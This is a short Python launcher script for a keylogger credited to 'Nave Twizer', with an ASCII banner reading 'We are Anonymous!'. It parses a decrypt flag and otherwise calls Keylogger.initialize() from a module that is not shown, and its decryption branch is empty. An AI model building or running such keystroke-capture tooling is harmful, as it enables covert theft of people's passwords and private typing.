import Keylogger
import argparse


description = r"""
KEYLOGGER BY NAVE TWIZER

 _    _                            ___                                                      _ 
| |  | |                          / _ \                                                    | |
| |  | | ___     __ _ _ __ ___   / /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___  | |
| |/\| |/ _ \   / _` | '__/ _ \  |  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __| | |
\  /\  /  __/  | (_| | | |  __/  | | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \ |_|
 \/  \/ \___|   \__,_|_|  \___|  \_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/ (_)
                                                           __/ |                              
                                                          |___/                               

"""



parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-d', '--decrypt', help='decrypt logs', action='store_true')

args = parser.parse_args()

if not args.decrypt:
    Keylogger.initialize()
else:
    pass    
    #DECRYPTION LOGIC HERE